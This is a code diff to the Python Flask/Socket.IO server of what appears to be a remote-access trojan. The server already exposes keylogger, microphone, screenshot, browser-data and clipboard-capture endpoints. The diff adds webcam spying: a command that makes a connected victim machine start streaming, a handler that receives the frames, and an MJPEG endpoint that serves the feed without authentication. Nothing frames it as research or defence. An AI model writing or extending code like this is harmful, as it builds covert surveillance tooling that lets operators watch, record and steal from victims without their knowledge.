@@ -2,16 +2,19 @@ import base64
 import json
 import logging
 import os
+import threading
 from datetime import datetime
+from queue import Queue
 from logging.handlers import RotatingFileHandler
 
 import click
-from flask import Flask, request, send_file
+from flask import Flask, request, send_file, Response
 from flask_jwt_extended import create_access_token, jwt_required, JWTManager
 from flask_migrate import Migrate
 from flask_restx import Api, Resource, fields
 from flask_socketio import SocketIO
 
+from client.media_utils import gen_frames
 from config.config import Config
 from config.extensions import db
 from models import Client, Command, CommandType
@@ -22,8 +25,9 @@ app.config['DEBUG'] = True
 db.init_app(app)
 migrate = Migrate(app, db)
 jwt = JWTManager(app)
+video_frames = Queue()
 
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', max_http_buffer_size=10 ** 8)
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', max_http_buffer_size=50 ** 8)
 
 authorizations = {
     'bearer_auth': {
@@ -44,6 +48,7 @@ screenshot_ns = api.namespace('api/v1/screenshot', description='Screenshot opera
 microphone_ns = api.namespace('api/v1/microphone', description='Microphone operations')
 browser_ns = api.namespace('api/v1/browser', description='Browser data operations')
 keylogger_ns = api.namespace('api/v1/keylogger', description='Keylogger operations')
+webcam_ns = api.namespace('api/v1/webcam', description='Webcam operations')
 papier_ns = api.namespace('api/v1/papier', description='Papier operations')
 
 auth_model = api.model('Auth', {'secret_key': fields.String(required=True, description='Clé secrète')})
@@ -335,6 +340,31 @@ class GetPapierFile(Resource):
             return {'status': 'error', 'message': 'Fichier du papier non trouvé.'}, 404
 
 
+@webcam_ns.route('/link/<int:client_id>')
+class GetWebcamLink(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    def get(self, client_id):
+        client = Client.query.get(client_id)
+        if client:
+            return {'status': 'success', 'message': f'La webcam est disponible sur le lien suivant: /webcam/{client_id}'}, 200
+        else:
+            return {'status': 'error', 'message': 'Client non trouvé.'}, 404
+
+@webcam_ns.route('/<int:client_id>')
+class StreamWebcam(Resource):
+    def get(self, client_id):
+        client = Client.query.get(client_id)
+        if not client:
+            return {'status': 'error', 'message': 'Client non trouvé.'}, 404
+        if client.status == 'offline':
+            return {'status': 'error', 'message': 'Client hors ligne.'}, 400
+
+        socketio.emit('start_stream', room=client.sid)
+        threading.Thread(target=gen_frames, args=(socketio,)).start()
+        return Response(stream_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
+
+
 @socketio.on('connect')
 def handle_connect():
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -466,6 +496,12 @@ def handle_clipboard(data):
             db.session.commit()
         app.logger.info(f"Contenu du presse-papiers reçu de {client.ip} et enregistré sous {clipboard_path}")
 
+@socketio.on('webcam_response')
+def handle_frame(data):
+    frame_data = base64.b64decode(data.get('data'))
+    video_frames.put(frame_data)
+
+
 @socketio.on('disconnect')
 def handle_disconnect():
     sid = request.sid
@@ -476,6 +512,12 @@ def handle_disconnect():
         db.session.commit()
         app.logger.info(f"Client déconnecté: {client.ip}")
 
+
+def stream_frames():
+    while True:
+        frame_data = video_frames.get()
+        yield (b'--frame\r\n'
+               b'Content-Type: image/jpeg\r\n\r\n' + frame_data + b'\r\n')
 
 setup_logging()
 if __name__ == '__main__':
